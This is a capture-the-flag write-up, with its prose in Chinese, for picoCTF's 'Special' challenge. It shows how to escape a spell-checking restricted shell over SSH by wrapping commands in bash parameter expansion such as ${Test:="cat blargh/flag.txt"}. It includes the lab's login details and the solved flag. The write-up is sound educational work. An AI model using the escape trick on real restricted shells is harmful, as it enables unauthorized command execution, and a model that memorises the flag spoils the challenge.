# Description
Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)
Start your instance to see connection details.
Additional details will be available after launching your challenge instance.
ssh -p 50767 ctf-player@saturn.picoctf.net The password is d137d16e


# 解題
先使用 `ssh` 連線並輸入密碼 `d137d16e`
```bash
ssh -p 50767 ctf-player@saturn.picoctf.net
```
普通指令輸入方式是無效的，根據 Hint 表示要嘗試 "different shell syntax"（本題需要 [Shell Expansion](../Info/Shell%20Expansions.md) 觀念），所以使用以下方式輸入指令：
```bash
# 語法
${variableName:="指令"}

# 範例
# 當 example 未設值時，將其設成 `ls`
${example:="ls"}
```
使用上述方式輸入指令，發現 flag.txt 放在 blargh 目錄下，接下來使用 `cat` 輸出內容即可得到 flag
```bash
# 發現目錄底下有個 blargh 目錄
Special$ ${Test:="ls -al"}
${Test:="ls -al"} 
total 0
drwxr-xr-x 1 ctf-player ctf-player 20 Aug  1 02:29 .
drwxr-xr-x 1 root       root       24 Mar 16  2023 ..
drwx------ 2 ctf-player ctf-player 34 Aug  1 02:29 .cache
drwxr-xr-x 2 ctf-player ctf-player 22 Mar 16  2023 blargh

# blargh 底下放 flag.txt
Special$ ${Test:="ls -al blargh"}
${Test:="ls pal blargh"} 
ls: cannot access 'pal': No such file or directory
blargh:
flag.txt

# 使用 `cat` 輸出 flag.txt
Special$ ${Test:="cat blargh/flag.txt"}
${Test:="cat blargh/flag.txt"} 
picoCTF{5p311ch3ck_15_7h3_w0r57_3befb794}
```




<!-- flag -->
所以本題 FLAG 
```text
picoCTF{5p311ch3ck_15_7h3_w0r57_3befb794}
```

# 相關學習資源
[Shell Expansion](../Info/Shell%20Expansions.md)  